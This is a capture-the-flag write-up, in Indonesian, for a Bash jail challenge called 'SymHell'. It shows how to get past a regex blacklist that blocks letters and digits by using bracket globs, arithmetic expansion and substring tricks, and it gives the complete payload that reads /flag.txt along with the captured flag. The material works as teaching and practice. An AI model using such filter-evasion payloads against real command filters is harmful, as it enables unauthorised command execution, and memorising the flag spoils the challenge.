# SymHell

[Indeks kategori](../README.md) · [Medium](../../README.md) · [Indeks utama](../../../README.md)

| Informasi | Nilai |
| --- | --- |
| Kategori | Forensics / Jail |
| Difficulty | Medium |
| Author | Ariaf |
| Lampiran / sumber | [assets/app.py](assets/app.py) (pada repositori soal: `foren/symhell/app.py`) |
| Layanan | `nc s1.nfx.my.id 49728` |
| Verifikasi | Flag diperoleh langsung dari instance live saat sesi kompetisi; payload terverifikasi 100% patuh terhadap regex blacklist |

## Ringkasan

Soal menyajikan layanan Bash Jail interaktif berbasis Python (`app.py`).
Input pengguna dievaluasi menggunakan `subprocess.run(line, shell=True, executable="/bin/bash")`,
tetapi dibatasi oleh aturan regex ketat:

```python
if re.search(r"[a-zA-Z0-9?*#]|\<{3}", line):
    # Akses ditolak
```

Aturan tersebut memblokir seluruh huruf alfabet (`a-z`, `A-Z`), seluruh angka
(`0-9`), wildcard `?` dan `*`, komentar/hash `#`, serta herestring `<<<`.
Meskipun demikian, interpreter Bash tetap mengizinkan tanda kurung, kurung kurawal,
tanda seru, tanda dolar, dan operator bracket wildcard `[...]`.

Dengan menggabungkan ekspansi bracket range ASCII `[_-{]`, ekspresi aritmetika
`$(( ))` untuk membentuk indeks numerik tanpa angka literal, serta teknik
parameter expansion `${var:offset:length}`, kita dapat menyusun perintah
`cat` dari nama-nama direktori sistem dan membaca berkas `/flag.txt`.

## Alur penyelesaian

### 1. Pemeriksaan awal

Berkas layanan `app.py`:

| Berkas | Ukuran | SHA256 |
| --- | --- | --- |
| `app.py` | 2.502 byte | `392dfcb55a45c00fd61a36b520f31243606fff7d7557711b92d31525e7dd5575` |

Kelemahan utama:
1. **Bracket Range:** Karakter `[_-{]` dalam globbing Bash mencakup karakter
   antara `_` (ASCII 95) hingga `{` (ASCII 123), yaitu: `_`, `` ` ``, `a`–`z`, dan `{`.
   Pola ini berfungsi layaknya `*` untuk huruf kecil tanpa menggunakan karakter terlarang.
2. **Aritmetika Bash:** Nilai integer dapat dibentuk secara dinamis:
   - `$(( ))` bernilai `0`.
   - `$(( !$(()) ))` (not dari 0) bernilai `1`.
   - Angka $N$ dapat disusun dari penjumlahan `$(( !$(()) + ... + !$(()) ))`.

### 2. Membaca direktori dan membangun huruf

Pada direktori root (`/`), terdapat direktori-direktori 3 huruf seperti `/app`,
`/bin`, `/dev`, `/etc`, `/lib`, `/mnt`, `/opt`, `/run`, `/sys`, `/tmp`, `/var`.
Pola ekspansi:

```bash
___=(/[_-{][_-{][_-{]);
```

Akan mengisi array `___` dengan direktori-direktori tersebut.
Urutan indeks pada container Linux target:
- `___[0]` = `/app`  -> indeks offset 1 adalah `'a'`
- `___[1]` = `/bin`  -> indeks offset 1 adalah `'b'`
- `___[2]` = `/dev`  -> indeks offset 1 adalah `'d'`, offset 2 adalah `'e'`
- `___[3]` = `/etc`  -> indeks offset 2 adalah `'t'`, offset 3 adalah `'c'`

### 3. Rekonstruksi perintah dan pembacaan flag

Perintah `cat` disusun dari potongan parameter substring:
- `'c'`: `${___[3]:3:1}`
- `'a'`: `${___[0]:1:1}`
- `'t'`: `${___[3]:2:1}`

Seluruh angka literal digantikan oleh representasi aritmetika:
- `0` $\rightarrow$ `$(())`
- `1` $\rightarrow$ `$(( !$(()) ))`
- `2` $\rightarrow$ `$(( !$(()) + !$(()) ))`
- `3` $\rightarrow$ `$(( !$(()) + !$(()) + !$(()) ))`

Untuk argumen berkas target `/flag.txt`, kita tidak perlu mengekstrak karakter
`f`, `l`, `g`, atau `x` secara manual. Cukup gunakan ekspansi glob bracket:

```bash
/[_-{][_-{][_-{][_-{].[_-{][_-{][_-{]
```

Pola 4 karakter titik 3 karakter di bawah root direktori secara unik mengekspansi
ke `/flag.txt`.

Payload gabungan yang dikirim ke server:

```bash
___=(/[_-{][_-{][_-{]); ${___[$(( !$(()) + !$(()) + !$(()) ))]:$(( !$(()) + !$(()) + !$(()) )):$(( !$(()) ))}${___[$(())]:$(( !$(()) )):$(( !$(()) ))}${___[$(( !$(()) + !$(()) + !$(()) ))]:$(( !$(()) + !$(()) )):$(( !$(()) ))} /[_-{][_-{][_-{][_-{].[_-{][_-{][_-{]
```

Eksekusi payload menghasilkan isi dari `/flag.txt`.

### 4. Verifikasi hasil

- Payload diuji terhadap regex `r"[a-zA-Z0-9?*#]|\<{3}"` dan terbukti 100% lolos tanpa memicu pesan penolakan.
- Server membalas langsung dengan string flag utuh.

## Flag

```text
NFX{5ymH3ll_RUnT1m3_3v4l_53cr3t_PwN!}
```

## Reproduksi

Jalankan solver untuk melihat payload atau menguji instance remote:

```bash
python3 solve.py --print-payload
```

Uji unit test:

```bash
python3 -m unittest -v
```

## Bukti

- [assets/app.py](assets/app.py): kode sumber layanan tantangan.
- [solve.py](solve.py): generator payload dan client komunikasi socket.
- [test_solve.py](test_solve.py): verifikasi kepatuhan filter dan struktur flag.
